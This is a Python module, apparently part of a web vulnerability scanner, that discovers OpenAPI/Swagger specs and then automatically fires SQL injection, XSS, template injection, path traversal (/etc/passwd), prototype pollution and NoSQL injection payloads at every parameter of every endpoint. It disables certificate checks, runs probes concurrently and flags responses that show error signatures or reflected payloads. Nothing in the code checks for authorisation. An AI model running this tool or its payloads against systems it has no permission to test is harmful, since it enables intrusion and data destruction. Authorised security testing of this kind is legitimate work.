"""
openapi_crawler.py — Parse OpenAPI/Swagger specs to extract all endpoints,
and auto-attack every parameter with type-aware injection payloads.

Supports OpenAPI 2.x (Swagger) and 3.x.  Called by AdaptiveReconEngine
_phase_api_intelligence() after URL-pattern discovery to merge spec-declared
endpoints into the api_map regardless of whether they appear in crawled URLs.

New in R6: auto_attack(spec_url) — parses a spec and runs rate-limited async
injection probes against every endpoint/parameter combination.
"""
from __future__ import annotations

import asyncio
import hashlib
import json
import logging
import re
import ssl
import time
import urllib.error
import urllib.parse
import urllib.request
from typing import Any

log = logging.getLogger("oneinfinity.openapi_crawler")

# Well-known spec paths probed in priority order
_SPEC_PATHS: list[str] = [
    "/static/openapi.json",
    "/openapi.json",
    "/openapi.yaml",
    "/swagger.json",
    "/swagger.yaml",
    "/api/swagger.json",
    "/api/openapi.json",
    "/api/docs/swagger.json",
    "/api-docs",
    "/api-docs.json",
    "/api-docs/swagger.json",
    "/v1/openapi.json",
    "/v2/openapi.json",
    "/api/v1/openapi.json",
    "/api/v2/openapi.json",
    "/docs/openapi.json",
]


def _fetch_json(url: str, timeout: int = 8) -> Any | None:
    """Fetch URL and return parsed JSON, or None on any failure."""
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        req = urllib.request.Request(
            url,
            headers={
                "User-Agent": "Mozilla/5.0 (OneInfinity/2.0; OpenAPI-Crawler)",
                "Accept":     "application/json, application/yaml, text/yaml, */*",
            },
        )
        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as resp:
            if resp.status not in (200, 206):
                return None
            raw = resp.read(4_000_000).decode("utf-8", errors="replace")
            stripped = raw.strip()
            if not stripped:
                return None
            # Reject HTML pages masquerading as JSON
            if stripped.startswith("<!"):
                return None
            if stripped.startswith("{") or stripped.startswith("["):
                return json.loads(raw)
            return None
    except Exception:
        return None


def _parse_openapi_spec(spec: dict) -> list[dict]:
    """
    Extract endpoint records from an OpenAPI 2.x or 3.x spec dict.

    Returns list of:
        {
            "path":         str,          # e.g. "/api/v1/users/{id}"
            "method":       str,          # e.g. "GET"
            "auth_required": bool,
            "source":       "openapi_spec",
            "summary":      str,
            "tags":         list[str],
            "params":       list[dict],   # {name, in, type, enum, required}
        }
    """
    if not isinstance(spec, dict):
        return []

    paths = spec.get("paths")
    if not isinstance(paths, dict):
        return []

    # Global security: non-empty list means auth required by default
    global_security: bool = bool(spec.get("security"))

    # OpenAPI 3.x uses components/schemas; 2.x uses definitions — resolve $ref
    definitions: dict = (
        spec.get("components", {}).get("schemas", {})
        or spec.get("definitions", {})
    )

    HTTP_METHODS = ("get", "post", "put", "delete", "patch", "head", "options")
    endpoints: list[dict] = []

    def _resolve_type(schema: dict) -> str:
        """Best-effort type name from a schema object or $ref."""
        if not isinstance(schema, dict):
            return "string"
        ref = schema.get("$ref", "")
        if ref:
            # #/components/schemas/Foo  or  #/definitions/Foo
            return ref.rsplit("/", 1)[-1].lower()
        return schema.get("type", "string").lower()

    def _extract_params(op: dict, path_item: dict) -> list[dict]:
        """Merge path-level and operation-level parameters; resolve basic types."""
        raw: list = list(path_item.get("parameters", []))
        raw.extend(op.get("parameters", []))

        # OA3 requestBody → treat body fields as "body" params
        rb = op.get("requestBody", {})
        content = rb.get("content", {})
        for media_type, media_obj in content.items():
            if not isinstance(media_obj, dict):
                continue
            schema = media_obj.get("schema", {})
            props = schema.get("properties", {})
            for prop_name, prop_schema in props.items():
                raw.append({
                    "name": prop_name,
                    "in": "body",
                    "schema": prop_schema,
                    "required": prop_name in schema.get("required", []),
                })

        params: list[dict] = []
        for p in raw:
            if not isinstance(p, dict):
                continue
            name = p.get("name", "")
            if not name:
                continue
            schema = p.get("schema") or p  # OA3 wraps type in schema; OA2 inline
            params.append({
                "name": name,
                "in": p.get("in", "query"),
                "type": _resolve_type(schema),
                "enum": schema.get("enum"),
                "required": bool(p.get("required", False)),
                "format": schema.get("format", ""),
            })
        return params

    for path, path_item in paths.items():
        if not isinstance(path_item, dict) or not path:
            continue
        for method in HTTP_METHODS:
            op = path_item.get(method)
            if not isinstance(op, dict):
                continue
            # Operation-level security overrides global; [] means explicitly unauthenticated
            if "security" in op:
                auth_required = bool(op["security"])
            else:
                auth_required = global_security

            endpoints.append({
                "path":         path,
                "method":       method.upper(),
                "auth_required": auth_required,
                "source":       "openapi_spec",
                "summary":      op.get("summary", ""),
                "tags":         op.get("tags", []),
                "params":       _extract_params(op, path_item),
            })

    return endpoints


def crawl_openapi(
    target: str,
    discovered_urls: list[str] | None = None,
    timeout: int = 8,
) -> list[dict]:
    """
    Discover and parse an OpenAPI/Swagger spec for *target*.

    Strategy:
      1. Check discovered_urls for anything that looks like a spec URL.
      2. Probe the well-known paths in _SPEC_PATHS.
      3. Parse the first valid spec found.
      4. Return deduplicated list of endpoint dicts.

    Args:
        target: Base URL (e.g. "https://vulnbank.org") or bare hostname.
        discovered_urls: URLs already found during recon (source: httpx, crawler, etc.).
        timeout: Per-request connect+read timeout in seconds.

    Returns:
        List of endpoint dicts: {path, method, auth_required, source, summary, tags}
    """
    base = target if target.startswith("http") else f"https://{target}"
    base = base.rstrip("/")

    candidates: list[str] = []

    # Priority 1: spec-like URLs already in the recon corpus
    for url in (discovered_urls or []):
        u_lower = url.lower()
        if any(
            kw in u_lower
            for kw in ["openapi", "swagger", "api-docs", "api_docs", "/docs/"]
        ):
            if url not in candidates:
                candidates.append(url)

    # Priority 2: well-known probe paths
    for path in _SPEC_PATHS:
        url = f"{base}{path}"
        if url not in candidates:
            candidates.append(url)

    seen_path_method: set[tuple[str, str]] = set()
    all_endpoints: list[dict] = []

    for url in candidates:
        spec = _fetch_json(url, timeout=timeout)
        if not spec:
            continue
        if "paths" not in spec:
            continue

        eps = _parse_openapi_spec(spec)
        if not eps:
            continue

        log.info("[OpenAPICrawler] Parsed %s — %d endpoint operations", url, len(eps))

        for ep in eps:
            key = (ep["path"], ep["method"])
            if key not in seen_path_method:
                seen_path_method.add(key)
                all_endpoints.append(ep)

        # First successful spec is authoritative; stop here
        break

    if all_endpoints:
        log.info("[OpenAPICrawler] Total unique endpoints extracted: %d", len(all_endpoints))
    else:
        log.debug("[OpenAPICrawler] No OpenAPI spec found for %s", base)

    return all_endpoints

# ---------------------------------------------------------------------------
# Type-aware injection payload catalogue
# ---------------------------------------------------------------------------

# integer/number params → SQLi and integer overflow
_PAYLOADS_INT: list[tuple[str, str]] = [
    ("' OR 1=1--",          "sqli"),
    ("1 UNION SELECT 1--",  "sqli"),
    ("-1",                   "business_logic"),
    ("999999999",            "integer_overflow"),
    ("0",                    "business_logic"),
]

# string params → XSS, SSTI, path traversal
_PAYLOADS_STR: list[tuple[str, str]] = [
    ("<script>alert(1)</script>",      "xss"),
    ("{{7*7}}",                        "ssti"),
    ("${7*7}",                         "ssti"),
    ("../../../etc/passwd",            "path_traversal"),
    ("' OR 'x'='x",                   "sqli"),
    ("\"; DROP TABLE users;--",        "sqli"),
    ("javascript:alert(1)",            "xss"),
    ("<img src=x onerror=alert(1)>",   "xss"),
]

# enum params → unexpected values (business logic / access control)
_PAYLOADS_ENUM: list[tuple[str, str]] = [
    ("admin",         "business_logic"),
    ("superuser",     "business_logic"),
    ("internal",      "business_logic"),
    ("*",             "wildcard_enum"),
]

# boolean params → force true
_PAYLOADS_BOOL: list[tuple[str, str]] = [
    ("true",  "business_logic"),
    ("1",     "business_logic"),
]

# object/array params → prototype pollution / mass assignment
_PAYLOADS_OBJ: list[tuple[str, str]] = [
    ('{"__proto__":{"admin":true}}',  "prototype_pollution"),
    ('{"admin":true,"role":"admin"}', "mass_assignment"),
    ('[{"$ne": null}]',               "nosql_injection"),
]

# map OpenAPI schema type → payload list
_TYPE_PAYLOADS: dict[str, list[tuple[str, str]]] = {
    "integer": _PAYLOADS_INT,
    "number":  _PAYLOADS_INT,
    "string":  _PAYLOADS_STR,
    "boolean": _PAYLOADS_BOOL,
    "object":  _PAYLOADS_OBJ,
    "array":   _PAYLOADS_OBJ,
}

# Detection patterns in HTTP response bodies
_ERROR_SIGNATURES: list[re.Pattern] = [
    re.compile(r"sql\s*syntax|sqlite|mysql|postgresql|ora-\d{5}", re.I),
    re.compile(r"traceback|stack trace|exception in|syntaxerror", re.I),
    re.compile(r"template render error|jinja2|freemarker|twig", re.I),
    re.compile(r"root:|/etc/passwd|/etc/shadow", re.I),
    re.compile(r"<script>alert\(1\)</script>", re.I),
    re.compile(r'"admin"\s*:\s*true', re.I),
]


def _fid_attack(method: str, url: str, param: str, vuln_type: str) -> str:
    raw = f"{method}:{url}:{param}:{vuln_type}"
    return hashlib.md5(raw.encode()).hexdigest()[:16]


def _ssl_ctx() -> ssl.SSLContext:
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx


async def _probe_param(
    base_url: str,
    path: str,
    method: str,
    param: dict,
    payload: str,
    vuln_type: str,
    auth_headers: dict,
    timeout: int,
    rate_limit: float,
) -> dict | None:
    """
    Send a single injection probe and return a finding dict on detection,
    or None if no indicator found.
    """
    await asyncio.sleep(rate_limit)
    loop = asyncio.get_event_loop()

    # Substitute path params inline; query/body go via their normal channels
    param_name = param["name"]
    param_loc  = param.get("in", "query")
    target_path = re.sub(rf"\{{{re.escape(param_name)}}}", payload, path)

    full_url = base_url.rstrip("/") + target_path

    headers = {
        "User-Agent": "Mozilla/5.0 (OneInfinity/2.0; OpenAPIAutoAttack)",
        "Accept": "application/json, */*",
        **auth_headers,
    }
    body_bytes: bytes | None = None

    if param_loc == "query":
        parsed = urllib.parse.urlparse(full_url)
        qs = dict(urllib.parse.parse_qsl(parsed.query))
        qs[param_name] = payload
        full_url = urllib.parse.urlunparse(
            parsed._replace(query=urllib.parse.urlencode(qs))
        )
    elif param_loc in ("body", "formData"):
        headers["Content-Type"] = "application/json"
        body_bytes = json.dumps({param_name: payload}).encode()
    elif param_loc == "header":
        headers[param_name] = payload
    # path injection already done above via regex substitution

    def _do_request() -> tuple[int, bytes]:
        try:
            req = urllib.request.Request(
                full_url, data=body_bytes, method=method.upper(), headers=headers
            )
            ctx = _ssl_ctx()
            with urllib.request.urlopen(req, timeout=timeout, context=ctx) as resp:
                return resp.status, resp.read(512_000)
        except urllib.error.HTTPError as exc:
            try:
                return exc.code, exc.read(512_000)
            except Exception:
                return exc.code, b""
        except Exception:
            return 0, b""

    status, raw = await loop.run_in_executor(None, _do_request)
    if status == 0:
        return None

    body_str = raw.decode("utf-8", errors="replace")

    # Check for error/reflection signatures
    triggered = any(sig.search(body_str) for sig in _ERROR_SIGNATURES)
    # Also flag reflected payload (strong XSS/SSTI indicator)
    reflected = payload in body_str and len(payload) > 5

    if not (triggered or reflected):
        return None

    evidence = "reflection detected" if reflected else "error signature matched"
    log.info(
        "[OpenAPIAutoAttack] %s %s param=%s (%s) → %s HTTP %d",
        method, full_url, param_name, vuln_type, evidence, status,
    )
    return {
        "id": _fid_attack(method, full_url, param_name, vuln_type),
        "vuln_type": vuln_type,
        "severity": "high" if vuln_type in ("sqli", "ssti", "path_traversal") else "medium",
        "title": f"OpenAPI Auto-Attack — {vuln_type} on {method} {path} [{param_name}]",
        "url": full_url,
        "method": method,
        "endpoint": path,
        "param": param_name,
        "param_location": param_loc,
        "payload": payload,
        "evidence": evidence,
        "http_status": status,
        "tool": "openapi_auto_attack",
        "description": (
            f"Injection probe '{payload}' sent to parameter '{param_name}' "
            f"({param_loc}) of {method} {path} triggered a {vuln_type} indicator. "
            f"Response HTTP {status}: {evidence}."
        ),
        "remediation": (
            "Validate and sanitise all input parameters. Use parameterised queries "
            "for database access and context-aware output encoding for all responses."
        ),
        "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
    }


async def auto_attack(
    spec_url: str,
    auth_headers: dict | None = None,
    timeout: int = 10,
    rate_limit: float = 0.25,
    max_endpoints: int = 100,
    max_payloads_per_param: int = 4,
) -> list[dict]:
    """
    Parse an OpenAPI spec at *spec_url* and auto-generate + execute type-aware
    injection tests for every discovered parameter.

    Algorithm:
      1. Fetch and parse the spec (JSON or YAML).
      2. For each endpoint × parameter combination, select payloads based on
         the declared schema type (integer → SQLi/overflow, string → XSS/SSTI,
         enum → business-logic probes, object → prototype pollution / NoSQL).
      3. Execute all probes asynchronously with *rate_limit* second delay
         between requests per coroutine (bounded concurrency via semaphore).
      4. Return findings deduped by (method, path, param, vuln_type).

    Args:
        spec_url:             Full URL to the OpenAPI/Swagger JSON spec.
        auth_headers:         HTTP headers to include in every probe (e.g. Bearer token).
        timeout:              Per-request timeout in seconds.
        rate_limit:           Minimum seconds between outbound requests.
        max_endpoints:        Cap on endpoints processed (avoids runaway on huge specs).
        max_payloads_per_param: Max injection payloads tested per parameter.

    Returns:
        List of finding dicts compatible with the OneInfinity finding schema.
    """
    hdrs = dict(auth_headers or {})

    # --- Step 1: fetch spec ------------------------------------------------
    spec = _fetch_json(spec_url, timeout=timeout)
    if not spec or "paths" not in spec:
        log.debug("[OpenAPIAutoAttack] No valid spec at %s", spec_url)
        return []

    # --- Step 2: derive base URL from spec (servers / host) -----------------
    parsed_spec_url = urllib.parse.urlparse(spec_url)
    base_url_default = f"{parsed_spec_url.scheme}://{parsed_spec_url.netloc}"

    # OpenAPI 3.x
    servers = spec.get("servers", [])
    if servers and isinstance(servers[0], dict):
        base_url_default = servers[0].get("url", base_url_default).rstrip("/")
    # OpenAPI 2.x (Swagger)
    elif spec.get("host"):
        scheme = (spec.get("schemes") or ["https"])[0]
        base_path = spec.get("basePath", "").rstrip("/")
        base_url_default = f"{scheme}://{spec['host']}{base_path}"

    # --- Step 3: extract all endpoints with params --------------------------
    endpoints = _parse_openapi_spec(spec)[:max_endpoints]

    # --- Step 4: build coroutine list ---------------------------------------
    sem = asyncio.Semaphore(8)  # max 8 concurrent probes
    findings: list[dict] = []
    seen_ids: set[str] = set()

    async def _bounded(coro):
        async with sem:
            return await coro

    tasks: list = []
    for ep in endpoints:
        method  = ep["method"]
        path    = ep["path"]
        params  = ep.get("params", [])
        if not params:
            continue

        for param in params:
            param_type = param.get("type", "string").lower()
            enum_vals  = param.get("enum")

            # Choose payload set
            if enum_vals:
                payload_list = _PAYLOADS_ENUM
            else:
                payload_list = _TYPE_PAYLOADS.get(param_type, _PAYLOADS_STR)

            for payload, vuln_type in payload_list[:max_payloads_per_param]:
                tasks.append(_bounded(_probe_param(
                    base_url=base_url_default,
                    path=path,
                    method=method,
                    param=param,
                    payload=payload,
                    vuln_type=vuln_type,
                    auth_headers=hdrs,
                    timeout=timeout,
                    rate_limit=rate_limit,
                )))

    if not tasks:
        log.debug("[OpenAPIAutoAttack] No parameterised endpoints found in %s", spec_url)
        return []

    log.info("[OpenAPIAutoAttack] Launching %d probes for spec %s", len(tasks), spec_url)
    results = await asyncio.gather(*tasks, return_exceptions=True)

    for r in results:
        if isinstance(r, dict):
            fid = r.get("id", "")
            if fid not in seen_ids:
                seen_ids.add(fid)
                findings.append(r)
        elif isinstance(r, Exception):
            log.debug("[OpenAPIAutoAttack] probe raised: %s", r)

    log.info(
        "[OpenAPIAutoAttack] Complete: %d findings from spec %s",
        len(findings), spec_url,
    )
    return findings
